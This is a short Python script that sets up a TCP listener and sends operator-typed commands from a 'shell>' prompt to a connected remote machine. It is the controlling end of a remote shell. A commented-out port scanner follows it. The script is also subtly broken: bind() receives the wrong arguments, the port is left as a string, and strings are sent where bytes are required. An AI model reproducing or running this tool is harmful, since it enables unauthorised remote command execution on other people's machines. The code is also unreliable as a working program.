import socket

ip=input("input ip: ")
port=input("input port: ")
def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(ip,port)
    s.listen(1)
    print ('[+] Listening TCP connection on port')
    conn,addr=s.accept()
    print('[+]Got a connection from',addr)
    while True:
        command=input("shell>")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print (conn.recv(1024))

def __main__(self):
    connect(self)

#

# ip = input("ip: ")
# port=input("port: ")

# s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# if s.connect_ex((ip,port)):
#     print("[+]port",port,"closed")
# else:
#     print("[+]port",port,"open")
